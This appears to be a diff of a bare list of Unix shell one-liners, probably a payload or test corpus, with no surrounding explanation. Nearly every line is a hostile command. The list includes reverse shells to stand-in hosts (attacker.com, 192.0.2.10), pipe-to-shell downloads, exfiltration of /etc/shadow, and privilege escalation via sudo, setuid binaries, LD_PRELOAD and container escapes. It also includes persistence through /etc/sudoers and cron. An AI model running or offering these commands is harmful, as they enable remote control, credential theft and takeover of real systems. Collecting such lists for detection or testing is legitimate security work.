@@ -1,33 +1,137 @@
-/usr/sbin/service ../../bin/sh
-TF=$(mktemp) echo 'exec "/bin/sh";' >$TF cowsay -f $TF x
-LPORT=12345 socket -svp '/bin/sh -i' $LPORT
-LPORT=12345 socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
 xdg-user-dir '}; /bin/sh #'
-TF=$(mktemp) echo 'exec "/bin/sh";' >$TF cowthink -f $TF x
 puppet apply -e "exec { '/bin/sh -c \"exec sh -i <$(tty) >$(tty) 2>$(tty)\"': }"
-TF=$(mktemp -d) echo 'exec("/bin/sh")' > $TF/x.rb FACTERLIB=$TF facter
-TF=$(mktemp -d) cp /bin/sh $TF/zypper-x export PATH=$TF:$PATH zypper x
 dc -e '!/bin/sh'
-TF=$(mktemp -u) zip $TF /etc/hosts -T -TT 'sh #' rm $TF
-TF=$(mktemp) echo 'sh 0<&2 1>&2' > $TF chmod +x "$TF" scp -S $TF x y:
 xetex --shell-escape '\write18{/bin/sh}\end'
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
-RHOST=attacker.com RPORT=12345 nc -e /bin/sh $RHOST $RPORT
-TF=$(mktemp) echo '#!/bin/sh' > $TF echo 'exec /bin/sh -p 0<&1' >> $TF chmod +x $TF gtester -q $TF
-TF=$(mktemp -d) ln -s /bin/sh "$TF/git-x" git "--exec-path=$TF" x
-TF=$(mktemp) echo 'os.execute("/bin/sh")' >$TF pandoc -L $TF /dev/null
-RHOST=attacker.com RPORT=12345 busybox nc -e /bin/sh $RHOST $RPORT
 ssh -o ProxyCommand=';sh 0<&2 1>&2' x
-TF=$(mktemp -d) echo 'system("/bin/sh")' > $TF/x gem build $TF/x
-mkdir -p ~/.dstat echo 'import os; os.execv("/bin/sh", ["sh"])' >~/.dstat/dstat_xxx.py dstat --xxx
 c99 -wrapper /bin/sh,-s .
-TF=$(mktemp) echo 'os.execute("/bin/sh")' >$TF tshark -Xlua_script:$TF
-TF=$(mktemp -d) echo 'system("/bin/sh")' > $TF/Gemfile cd $TF bundler install
-echo '/bin/sh </dev/tty >/dev/tty' >localhost cpio -o --rsh-command /bin/sh -F localhost:
 rpmquery --eval '%{lua:posix.exec("/bin/sh")}'
-export RHOST=attacker.com export RPORT=12345 bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
-split --filter=/bin/sh /dev/stdin
 rpm --pipe '/bin/sh 0<&1'
-man '-H/bin/sh #' man
 socat stdin exec:/bin/sh
 pdftex --shell-escape '\write18{/bin/sh}\end'
+bash -c 'bash -i >& /dev/tcp/192.0.2.10/4444 0>&1'
+sh -c 'nc -e /bin/sh 192.0.2.10 4444'
+nc -e /bin/sh 192.0.2.10 4444
+nc -c /bin/sh 192.0.2.10 4444
+ncat --exec /bin/sh 192.0.2.10 4444
+ncat --ssl 192.0.2.10 4444 -e /bin/bash
+busybox nc 192.0.2.10 4444 -e /bin/sh
+socat TCP:192.0.2.10:4444 EXEC:/bin/sh
+socat TCP:192.0.2.10:4444 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
+socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/sh
+rm -f /tmp/p; mkfifo /tmp/p; cat /tmp/p | sh -i 2>&1 | nc 192.0.2.10 4444 >/tmp/p
+bash -c 'exec 5<>/dev/tcp/192.0.2.10/4444; cat <&5 | sh >&5 2>&5'
+curl -fsSL http://example.com/a.sh | sh
+wget -qO- http://example.com/a.sh | bash
+curl -o /tmp/a.sh http://example.com/a.sh; sh /tmp/a.sh
+wget -O /tmp/a http://example.com/a; chmod +x /tmp/a; /tmp/a
+ftp -inv example.com < /tmp/ftp.txt
+tftp example.com -m binary -c get a /tmp/a
+busybox wget -qO- http://example.com/a.sh | sh
+aria2c --allow-overwrite=true -d /tmp -o a http://example.com/a
+curl -X POST --data-binary @/etc/shadow http://example.com/upload
+wget --post-file=/etc/shadow http://example.com/upload
+curl -F file=@/etc/shadow http://example.com/upload
+nc 192.0.2.10 4444 < /etc/shadow
+bash -c 'cat /etc/shadow > /dev/tcp/192.0.2.10/4444'
+scp /etc/shadow user@example.com:/tmp/shadow
+rsync -e ssh /etc/shadow user@example.com:/tmp/shadow
+awk 'BEGIN {system("/bin/sh")}'
+nawk 'BEGIN {system("/bin/sh")}'
+mawk 'BEGIN {system("/bin/sh")}'
+gawk 'BEGIN {system("/bin/sh")}'
+find / -maxdepth 0 -exec /bin/sh \;
+find /tmp -name x -exec /bin/sh -p \; -quit
+find /tmp -name x -execdir /bin/sh \;
+vim -c ':!/bin/sh' /dev/null
+vim -c ':set shell=/bin/sh' -c ':shell'
+vi -c ':!/bin/sh' /dev/null
+ex -c '!/bin/sh' /dev/null
+view -c ':!/bin/sh' /dev/null
+rvim -c ':py3 import os; os.execl("/bin/sh", "sh")'
+nvim -c ':terminal /bin/sh' /dev/null
+man -P /bin/sh man
+GIT_PAGER=/bin/sh git -p help
+GIT_EDITOR=/bin/sh git config --global --edit
+git -c core.pager=/bin/sh -p help
+ssh -o ProxyCommand='sh 0<&2 1>&2' x
+ssh -F /dev/null -o LocalCommand=/bin/sh -o PermitLocalCommand=yes localhost
+scp -S /tmp/a.sh x y:
+sftp -D /bin/sh localhost
+rsync -e 'sh -c "sh 0<&2 1>&2"' x y:
+tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+tar -xf /tmp/a.tar --to-command=/bin/sh
+zip /tmp/a.zip /etc/hosts -T -TT 'sh #'
+python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+python -c 'import os; os.system("/bin/sh")'
+perl -e 'exec "/bin/sh";'
+ruby -e 'exec "/bin/sh"'
+php -r 'system("/bin/sh");'
+node -e 'require("child_process").spawn("/bin/sh",{stdio:"inherit"})'
+lua -e 'os.execute("/bin/sh")'
+R --no-save -e 'system("/bin/sh")'
+jruby -e 'exec "/bin/sh"'
+expect -c 'spawn /bin/sh; interact'
+sqlite3 /dev/null '.shell /bin/sh'
+mysql -e '\! /bin/sh'
+psql -c '\! /bin/sh'
+gdb -nx -batch -ex '!/bin/sh'
+gdb -nx -ex 'python import os; os.system("/bin/sh")' -ex quit
+strace -o /dev/null /bin/sh
+ltrace -o /dev/null /bin/sh
+script -q -c /bin/sh /dev/null
+timeout 60 /bin/sh -p
+nice -n 0 /bin/sh -p
+nohup /bin/sh -c 'sh -i </dev/tty >/dev/tty 2>&1'
+stdbuf -i0 /bin/sh -p
+setarch $(uname -m) /bin/sh -p
+setsid /bin/sh -c 'sh -i </dev/tty >/dev/tty 2>&1'
+flock /tmp/lock /bin/sh -p
+watch -x /bin/sh -c 'id > /tmp/id'
+xargs -a /dev/null /bin/sh -p
+printf '/bin/sh\n' | xargs -I{} sh -c '{}'
+printf 'system("/bin/sh")\n' | bc
+printf '!/bin/sh\n' | dc
+printf '/bin/sh\n' | at now
+printf 'os.execute("/bin/sh")' >/tmp/a.lua; pandoc -L /tmp/a.lua /dev/null
+printf 'os.execute("/bin/sh")' >/tmp/a.lua; tshark -Xlua_script:/tmp/a.lua
+printf 'exec "/bin/sh";' >/tmp/a.cow; cowsay -f /tmp/a.cow x
+printf 'exec "/bin/sh";' >/tmp/a.cow; cowthink -f /tmp/a.cow x
+make -s --eval=$'x:\n\t/bin/sh'
+rpm --eval '%{lua:os.execute("/bin/sh")}'
+apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+apt update -o APT::Update::Pre-Invoke::=/bin/sh
+sudo -u root /bin/sh -p
+sudo env /bin/sh -p
+sudo -u root /usr/bin/find / -maxdepth 0 -exec /bin/sh \;
+sudo -u root /usr/bin/awk 'BEGIN {system("/bin/sh")}'
+sudo LD_PRELOAD=/tmp/a.so /usr/bin/find /tmp -maxdepth 0
+LD_LIBRARY_PATH=/tmp /usr/bin/find /tmp -maxdepth 0
+docker run --rm -v /:/mnt -it alpine chroot /mnt /bin/sh
+docker exec -it container /bin/sh
+podman run --rm -v /:/mnt -it alpine chroot /mnt /bin/sh
+nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh
+unshare -r -m /bin/sh
+chroot / /bin/sh -p
+capsh --gid=0 --uid=0 -- -c /bin/sh
+bash -p -c /bin/sh
+/bin/dash -p -c /bin/sh
+screen -D -m /bin/sh -c 'id > /tmp/id'
+tmux new-session -d '/bin/sh -c "id > /tmp/id"'
+cp /bin/sh /tmp/sh; chmod u+s /tmp/sh; /tmp/sh -p
+install -m 4755 /bin/sh /tmp/sh
+python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+bash -c 'cat /etc/shadow'
+base64 /etc/shadow | base64 -d
+base32 /etc/shadow | base32 -d
+xxd /etc/shadow | xxd -r
+openssl enc -in /etc/shadow
+sed -n '1,200p' /etc/shadow
+awk '{print}' /etc/shadow
+tee /tmp/shadow < /etc/shadow
+tee -a /etc/sudoers < /tmp/sudoers
+printf '* * * * * root /tmp/a\n' >/etc/cron.d/updater
+printf '/tmp/a\n' | crontab -
+ln -s /bin/sh /tmp/git-x; git --exec-path=/tmp x
+cpio -o --rsh-command=/bin/sh -F localhost: </dev/null
+tex --shell-escape '\write18{/bin/sh}\end'
